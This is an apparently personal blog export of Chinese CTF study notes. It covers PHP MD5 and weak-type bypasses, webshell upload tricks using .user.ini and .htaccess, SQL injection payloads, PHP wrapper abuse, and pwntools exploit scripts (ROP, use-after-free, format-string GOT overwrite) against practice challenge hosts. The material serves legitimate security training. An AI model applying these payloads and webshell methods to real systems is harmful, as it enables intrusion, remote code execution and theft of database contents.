<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
<p>MD5和双MD5都是0e开头的几个值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>
<p>md5前后都是0e开头的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">0eRnJWi9XnKd9Z7x</span><br></pre></td></tr></table></figure>
<p>而如果想要达成这样的条件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span> &amp;&amp; md5(<span class="variable">$param1</span>) === md5(<span class="variable">$param2</span>)) &#123;</span><br><span class="line">    <span class="comment">// then</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>则可以将<code>$param1</code>和<code>$param2</code>定义为含有不同元素的两个数组。由于<code>md5</code>函数传入数组会返回<code>null</code>，两个强类型条件都得到满足。</p>
<p>不过如果两个参数都被强转了就没法传入数组来绕过，类似如下情况：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只能用一组特别特殊的md5碰撞值来绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b&#x3D;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>虽然不知道<code>$key</code>的值，但是可以赌他不以数字开头，只要他不以数字开头，一旦发生弱类型的隐式转换，只要令<code>$message-&gt;key</code>为0就可以绕过了。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>PHP文件上传题型记录</title>
    <url>/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h2><p>常规思路是上传一句话木马上去，然后用中国蚁剑拿个webshell。</p>
<p>直接传php文件传不了，就尝试其他也能执行php代码的格式，如：php3, php4, php5, phtml, pht等。</p>
<p>如果都不行，就尝试上传图片木马，在开头添加一个GIF的magic number骗一下，同时POST过去的时候用bp抓个包，把filename改成php代码后缀。</p>
<p>再不行可以尝试上传<code>.user.ini</code>，具体的做法如下：</p>
<p>不抓包修改后缀名，把图片木马直接上传，这一步应该是正常的。</p>
<p>然后再上传一个<code>.user.ini</code>文件，在里面写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;image.gif</span><br></pre></td></tr></table></figure>
<p>该文件上传后，在其所在目录访问任何php代码都会首先把<code>image.gif</code>里面的东西include进来，相当于将一句话木马通过文件包含的形式注入了。</p>
<a id="more"></a>
<p>最后直接上中国蚁剑拿webshell，地址即是同目录下的任一个php文件（如果没有就再上传一个普通的php上去然后连） </p>
<p>还有一种做法，提交<code>.htaccess</code>，内容如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><br>或者：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><br>前者把所有上传的东西都当做php文件执行，后者添加了<code>.jpg</code>结尾的文件可以当做php文件执行。</p>
<p>之后跟<code>.user.ini</code>差不多，不需要抓包把后缀名改掉，直接上传jpg文件即可。</p>
]]></content>
  </entry>
  <entry>
    <title>SQL注入题型总结</title>
    <url>/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="SQL架构"><a href="#SQL架构" class="headerlink" title="SQL架构"></a>SQL架构</h2><p>我们可以认为SQL有四层，自顶向下为：数据库，数据库中所含的表，表中的列，列中储存的内容。</p>
<p>一个数据库中有多个表，每一个表由若干行和列组成，列储存的是属性名称，而行储存的是内容。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li><code>version()</code>在一些支持的数据库发行版下可以拿到相关版本号，对于搜索历代CVE拿来打很有用处。</li>
<li><code>database()</code>获取当前在查询的数据库名称。</li>
<li><code>information_schema</code>是一个在版本大于5.0后默认存在的数据库，在我们利用的时候提供了非常大的用处。</li>
<li><code>group_concat</code>是一个把多个字符合成一个字符的方法，毕竟泄露的时候一般只能从一个字符的位置泄露出来。</li>
</ul>
<a id="more"></a>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li><code>database()</code>获知当前数据库名称</li>
<li><code>group_concat(table_name) from information_schema.tables where table_schema=database()</code>获取当前数据库中所有的表的名称</li>
<li><code>group_concat(column_name) from information_schema.columns where table_name=&#39;your_table_name&#39;</code>获取一个表中所有列的名称</li>
<li><code>group_concat(id, username, password) from your_table_name</code>获取<code>id, username, password</code>这些列中储存的值</li>
</ol>
<h2 id="经典万能密码"><a href="#经典万能密码" class="headerlink" title="经典万能密码"></a>经典万能密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<h2 id="常见过滤与绕过方法"><a href="#常见过滤与绕过方法" class="headerlink" title="常见过滤与绕过方法"></a>常见过滤与绕过方法</h2><ul>
<li>空格过滤：套一个括号，如<code>select A from B</code>变成<code>select(A)from(B)</code></li>
<li>双写绕过</li>
</ul>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a><code>union</code>查询</h3><p>经常直接跟在输入的后面，就像这样：<code>password=1&#39; union select ... #</code></p>
<p>就会产生<code>select password from table where password = &#39;1&#39; union select ... #&#39;</code></p>
<p>最后的引号要用井号注释掉，这样才不会产生语法错误。</p>
<p>另，<code>union</code>查询查询到并不存在的内容时，会创建出相应的内容出来，也就是写进了表中。</p>
<h3 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a><code>updatexml</code>报错</h3><p>原理是在<code>updatexml</code>使用过程中，第二个参数是元素的xpath，查找不到元素不但不会abort掉，还会把原本的经过解析过的参数通过报错信息输出出来。</p>
<p><code>1&#39; or updatexml(1, concat(0x7e, (your_input), 0x7e), 1) #</code></p>
<p>不过报错信息有点短，可以通过<code>left(str, 25)</code>和<code>right(str, 25)</code>的方法分别把左右两部分输出出来拿flag。</p>
<p>相似的常用的截取函数有：</p>
<ul>
<li><code>mid(column_name, start[, length])</code>填入字段，规定从<code>start</code>处开始的<code>length</code>个字符读出来（这里的<code>start</code>下标从1开始）</li>
<li><code>substr(str, start, length)</code>用法类似，下标也是从1开始</li>
<li><code>left(str, n)</code>与<code>right(str, n)</code>，分别查看前n位和后n位</li>
</ul>
<p>此外出现诸如<code>flag</code>被绕过的情况，可以用<code>CHR()</code>来表示一个个字符再用加号concat起来就行了。与<code>CHR</code>对应的是<code>ORD</code>，跟python的名字一样。</p>
]]></content>
  </entry>
  <entry>
    <title>Syntax Highlighting in Parsing Expression Grammar</title>
    <url>/2021/05/05/Syntax-Highlighting-in-Parsing-Expression-Grammar/</url>
    <content><![CDATA[<h2 id="What-is-Parsing-Expression-Grammar"><a href="#What-is-Parsing-Expression-Grammar" class="headerlink" title="What is Parsing Expression Grammar?"></a>What is Parsing Expression Grammar?</h2><p>Parsing Expression Grammar(PEG) describes a formal languages as a set of rules for recognizing strings in the language.</p>
<p>PEG is somewhat similar to Context Free Grammar(CFG), but the difference is that PEG follows “first match” rule, while CFG is ambiguous.</p>
<p>PEG has a linear-time complexity.</p>
<h2 id="Definition-of-PEG-Parser"><a href="#Definition-of-PEG-Parser" class="headerlink" title="Definition of PEG Parser"></a>Definition of PEG Parser</h2><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><p>Somewhat similar to regular expression</p>
<ul>
<li>Sequence <code>e1 e2</code></li>
<li>Choice <code>e1 / e2</code></li>
<li>Zero-or-more <code>e*</code></li>
<li>One-or-more <code>e+</code></li>
<li>Optional <code>e?</code></li>
<li>And-predicate <code>&amp;e</code></li>
<li>Not-predicate <code>!e</code></li>
</ul>
<h2 id="How-to-implement-curly-brace-blocks-like-C-and-Java"><a href="#How-to-implement-curly-brace-blocks-like-C-and-Java" class="headerlink" title="How to implement curly-brace blocks like C++ and Java?"></a>How to implement curly-brace blocks like C++ and Java?</h2><h2 id="How-to-implement-indentation-blocks-like-Python"><a href="#How-to-implement-indentation-blocks-like-Python" class="headerlink" title="How to implement indentation blocks like Python?"></a>How to implement indentation blocks like Python?</h2>]]></content>
  </entry>
  <entry>
    <title>Vim-surround备忘录</title>
    <url>/2022/01/25/Vim-Surround%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<p>一切的一切都要怪我根本记不得vim-surround的那些命令，以至于需要用的时候都得读readme，太丑陋了，所以找点时间梳理一下下。</p>
<p>vim-surround可以在normal模式下用，也可以在visual模式下用。</p>
<h2 id="normal"><a href="#normal" class="headerlink" title="normal"></a>normal</h2><p>根据第一个字母的区别，分为三种：</p>
<ul>
<li>ys: yield surrounding，带一个参数（下同）<ul>
<li>yss: yield the surrounding of the whole line</li>
<li>ys$: yield the surrounding of the interval from current cursor to end of line</li>
<li>ysiw: yield the surrounding of the next word</li>
<li>ys2w: yield the surrounding of the next 2 words (generalized to n, including 1)</li>
</ul>
</li>
<li>ds: delete surrounding，带一个参数（下同）</li>
<li>cs: change surrounding，带两个参数（下同）</li>
</ul>
<blockquote>
<p>其实如果在vim里面点开<code>:man</code></p>
</blockquote>
<a id="more"></a>
<h2 id="visual"><a href="#visual" class="headerlink" title="visual"></a>visual</h2><p>visual模式下使用比较单一，只能够选择区间，然后在两边添加，而不能删除或更改。（如果需要直接在normal模式操作了）</p>
<p>操作的方式很简单，先选区间，然后按S，后面跟一个参数即可。</p>
<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul>
<li>各类括号的左半边</li>
<li>各类括号的右半边</li>
<li>t: 已存在的xml的tag的指代</li>
</ul>
<p>总结的不全，但是已经足够日常使用了。</p>
]]></content>
  </entry>
  <entry>
    <title>Web Protocols</title>
    <url>/2021/08/30/Web-Protocols/</url>
    <content><![CDATA[<h2 id="Common-Web-Protocols"><a href="#Common-Web-Protocols" class="headerlink" title="Common Web Protocols"></a>Common Web Protocols</h2><h3 id="HTTP-amp-HTTPS"><a href="#HTTP-amp-HTTPS" class="headerlink" title="HTTP &amp; HTTPS"></a>HTTP &amp; HTTPS</h3><p>HTTP与HTTPS就是在浏览器中访问互联网网页所用到的协议。</p>
<p>HTTP就是应用最广泛的网络协议，数据在传输的过程中都是明文，所以运用HTTP协议来传输一些隐私数据就不安全。</p>
<p>HTTPS可以理解为安全版的HTTP协议，核心是加入了SSL(Secure Sockets Layer)，通过SSL协议完成对所传输内容的加密。</p>
<p>HTTP是无状态的，通过抓包修改包头通常能够实现身份的伪造，而HTTPS需要身份验证，相对更加安全。</p>
<a id="more"></a>
<h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><p>FILE协议是用来访问本地文件的，可以访问文件夹。</p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>FTP协议经常用在局域网中，通过该协议来进行文件的快速传输。</p>
<h3 id="BLOB"><a href="#BLOB" class="headerlink" title="BLOB"></a>BLOB</h3><p>目前在一些在线视频音乐播放网页中，在审查html找src的时候经常能够看到以<code>blob::</code>开头的链接，粘贴进浏览器却没法访问。</p>
<p>事实上blob协议的链接是一个本地创建的URL，通过这个只存在于本地的链接去访问视频音乐，并在使用结束后销毁掉该URL，这样能够减少相应文件被直接爬下来的情况出现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = URL.createObjectURL(<span class="keyword">new</span> Blob([<span class="string">&quot;hello, world!&quot;</span>], &#123;<span class="attr">type</span>: <span class="string">&quot;text/plain&quot;</span>&#125;))</span><br><span class="line"><span class="comment">// *url* stores the blob link</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.URL.revokeObjectURL(url)</span><br><span class="line"><span class="comment">// now accessing the url causes 404 error code</span></span><br></pre></td></tr></table></figure>
<h2 id="PHP-Pseudo-protocols"><a href="#PHP-Pseudo-protocols" class="headerlink" title="PHP Pseudo-protocols"></a>PHP Pseudo-protocols</h2><p>PHP的伪协议经常在文件包含的题目中运用到。</p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h3><p>编码流，可以用来获取php代码。不过如果直接read进来的话会把代码执行掉，想要不执行代码的话一般通过base64加密通过输出拿到手后再解密来看。</p>
<p>Example: <code>php://filter/read=convert.base64.encode/resource=useless.php</code></p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h3><p>输入流，可以用来执行POST数据中的php代码。不过在<code>enctype=&quot;multipart/form-data</code>的时候这种方法会失效。</p>
<h3 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h3><p>数据流，可以传入数据，支持MIME格式的解析。</p>
<p>Example:</p>
<ul>
<li><code>data://text/plain,&lt;?php phpinfo()?&gt;</code>，可以执行php代码，但没有试过。</li>
<li><code>data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>，最终的结果会是这串加密内容解密后的内容，可用来绕过过滤。</li>
</ul>
<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><ul>
<li><code>phar://</code></li>
<li><code>zlib://</code></li>
<li><code>glob://</code></li>
<li><code>rar://</code></li>
<li><code>ogg://</code></li>
<li><code>expect://</code></li>
</ul>
<p>这些没有见过，以后见到再补充吧。</p>
]]></content>
  </entry>
  <entry>
    <title>Writeup for First Week</title>
    <url>/2021/01/14/Writeup-for-First-Week/</url>
    <content><![CDATA[<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>傻了傻了，居然没想到用ROPgadget来找字符串，而只是在IDA Pro中看了而已。</p>
<p>system函数已经在Print函数中给出来了。只要有一个<code>/bin/sh</code>就够了。</p>
<p>但是这样也不准确，只需要<code>sh</code>就可以了。</p>
<p>以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string &#39;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27077</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(system_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080482ea</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h2 id="HITCON-training-hacknote"><a href="#HITCON-training-hacknote" class="headerlink" title="HITCON-training hacknote"></a>HITCON-training hacknote</h2><p>UAF第一道题。</p>
<p>UAF即free掉之后却没有置0，这个残留指针可以再被利用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>这道题挺好玩的，要好好记录一下。</p>
<p>IDA翻译成C出来根本没法读，只能看汇编（汇编更容易看</p>
<p>主程序在<code>vuln</code>函数里，先从<code>%rsp - 0x10</code>的地址开始读入至多0x400个字符，然后输出0x30个字符，显然栈溢出。</p>
<p>然后还有个<code>gadget</code>函数，很清楚地能看出<code>mov $0xf, %rax</code>和<code>mov $0x3b, %rax</code>这两个gadget，第一个是sigreturn的调用号，第二个就是execve的调用号。</p>
<p>然后针对这两个gadgets，分别有SROP和利用通用gadget做ROP这两种方法。</p>
<p>SROP在网上看到的似乎打不通，就只用普通ROP的做法。</p>
<p>由于需要控制rdx，需要辛苦点用上通用gadget。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;28690&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">csu_end = <span class="number">0x40059a</span></span><br><span class="line">csu_front = <span class="number">0x400580</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">mov_rax_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">buf = p.recv()[:<span class="number">8</span>]</span><br><span class="line">leak_addr = u64(buf)</span><br><span class="line">binsh_addr = leak_addr - <span class="number">0x138</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(mov_rax_ret)</span><br><span class="line">payload += p64(csu_end) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_front) + p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Writeup for Second Week</title>
    <url>/2021/01/22/Writeup-for-Second-Week/</url>
    <content><![CDATA[<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>32位格式化字符串漏洞，有几个特点需要注意：</p>
<ol>
<li>测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。</li>
<li>用格式化字符串漏洞泄露libc的时候用<code>%s</code>，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。</li>
<li><code>fmtstr_payload</code>填了四个参数，其中注意<code>numbwritten</code>参数，意思是格式化字符串中前面已有的字符数。0xa就是<code>Repeater:A</code>的位数。</li>
<li>最后劫持了<code>printf</code>的got表，填个分号做命令分割，就直接拿shell了。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;26090&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Repeater:A&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">8</span>)[-<span class="number">4</span>:]</span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line">log.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># log.info(hex(system_addr))</span></span><br><span class="line"><span class="comment"># log.info(hex(binsh_addr))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>, numbwritten=<span class="number">0xa</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。</p>
